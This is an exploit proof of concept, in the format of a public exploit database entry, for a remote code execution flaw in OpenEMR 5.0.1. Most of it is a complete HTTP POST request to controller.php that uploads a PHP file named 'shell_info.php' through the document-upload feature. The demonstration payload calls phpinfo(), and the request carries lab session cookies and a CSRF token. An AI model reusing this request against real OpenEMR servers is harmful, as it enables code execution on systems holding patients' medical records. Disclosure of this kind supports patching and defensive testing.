@@ -1,0 +1,66 @@
+# Exploit Title: OpenEMR 5.0.1 - 'controller' Remote Code Execution
+# Date: 2020-06-22
+# Exploit Author: Emre ÖVÜNÇ
+# Vendor Homepage: https://www.open-emr.org/
+# Software Link: https://www.open-emr.org/wiki/index.php/OpenEMR_Downloads
+# Version: v5.0.1
+# Tested on: Linux
+
+# Link: https://github.com/EmreOvunc/OpenEMR_Vulnerabilities
+
+# PoC
+
+To exploit vulnerability, someone could use
+'http://[HOST]/controller.php?document&upload&patient_id=00&parent_id=4&'
+post request to upload malicious php codes.
+
+POST /openemr-5.0.1/controller.php?document&upload&patient_id=00&parent_id=4&
+HTTP/1.1
+Host: [TARGET]
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:79.0)
+Gecko/20100101 Firefox/79.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://172.16.155.140/openemr-5.0.1/controller.php?document&upload&patient_id=00&parent_id=4&
+Content-Type: multipart/form-data;
+boundary=---------------------------141194333536146869123947219434
+Content-Length: 842
+Origin: http://172.16.155.140
+DNT: 1
+Connection: close
+Cookie: OpenEMR=t1lugo5qrbhv7mc2c3q9ricsnl;
+TreeMenuBranchStatus=objTreeMenu_1_node_1_9;
+PHPSESSID=dfhapc4v0bskt7pcpmc2j93agq;
+LS-VQGNEIWNPEBSNBWE=6rm848pgjj78hhecpb9roo8af1;
+YII_CSRF_TOKEN=OWYyM0lybGFtRF9wcHRkZ1lldF9WblhoVHlVNk5HRW3WMnZhghJHNtBjyIuALM94Ww3gltGLoeKETBSfevfbCw%3D%3D
+Upgrade-Insecure-Requests: 1
+
+-----------------------------141194333536146869123947219434
+Content-Disposition: form-data; name="MAX_FILE_SIZE"
+
+64000000
+-----------------------------141194333536146869123947219434
+Content-Disposition: form-data; name="file[]"; filename="shell_info.php"
+Content-Type: text/php
+
+<?php
+phpinfo();
+?>
+-----------------------------141194333536146869123947219434
+Content-Disposition: form-data; name="destination"
+
+
+-----------------------------141194333536146869123947219434
+Content-Disposition: form-data; name="patient_id"
+
+00
+-----------------------------141194333536146869123947219434
+Content-Disposition: form-data; name="category_id"
+
+4
+-----------------------------141194333536146869123947219434
+Content-Disposition: form-data; name="process"
+
+true
+-----------------------------141194333536146869123947219434--
